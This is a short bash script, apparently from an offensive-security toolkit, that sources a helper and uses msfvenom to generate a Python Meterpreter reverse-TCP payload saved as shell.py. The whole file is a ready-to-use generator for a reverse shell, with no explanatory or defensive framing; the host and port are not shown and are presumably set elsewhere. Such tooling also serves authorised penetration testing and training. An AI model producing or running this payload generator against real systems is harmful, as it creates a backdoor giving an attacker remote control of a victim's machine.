#!/bin/bash

: '
Create Python file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="python/meterpreter/reverse_tcp"
format="raw"
filename="shell.py"

create_reverse_shell "${payload}" "${format}" "${filename}"
